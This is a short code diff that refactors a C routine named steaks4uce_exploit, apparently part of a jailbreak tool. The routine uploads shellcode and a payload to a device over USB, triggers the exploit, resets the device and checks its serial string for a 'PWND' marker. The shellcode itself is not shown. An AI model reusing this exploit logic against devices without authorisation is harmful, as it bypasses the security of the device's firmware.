@@ -208,19 +208,13 @@ int steaks4uce_exploit(irecv_client_t client) {
     if (ret < 0)
         return -1;
 
-    printf("Uploading patched shellcode for %s: %#zx of data\n", devinfo->srtg, (size_t)steaks4uce_shellcode_len);
-    ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, steaks4uce_shellcode, steaks4uce_shellcode_len, 5000);
-    if (ret < 0) {
-        fprintf(stderr, "ERROR: Failed to send steaks4uce to the device.\n");
+    ret = send_data(client, steaks4uce_shellcode, steaks4uce_shellcode_len);
+    if (ret < 0)
         return -1;
-    }
 
-    printf("Uploading payload: %#zx of data\n", sizeof(payload));
-    ret = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, payload, sizeof(payload), 5000);
-    if (ret < 0) {
-        fprintf(stderr, "ERROR: Failed to upload payload.\n");
+    ret = send_data(client, payload, sizeof(payload));
+    if (ret < 0)
         return -1;
-    }
 
     printf("Triggering the exploit.\n");
     ret = irecv_usb_control_transfer(client, 0xA1, 1, 0, 0, payload, sizeof(payload), 1000);
@@ -231,16 +225,19 @@ int steaks4uce_exploit(irecv_client_t client) {
 
     release_device(client);
 
+    usleep(10000);
+
     ret = acquire_device(&client);
     if (ret < 0)
         return -1;
 
-    printf("Reconnecting to device.\n");
-    client = irecv_reconnect(client, 2);
-    if (client == NULL) {
-        fprintf(stderr, "ERROR: Unable to reconnect to device.\n");
+    usb_reset(client);
+
+    release_device(client);
+
+    ret = acquire_device(&client);
+    if (ret < 0)
         return -1;
-    }
 
     devinfo = irecv_get_device_info(client);
     char* p = strstr(devinfo->serial_string, "PWND:[steaks4uce]");
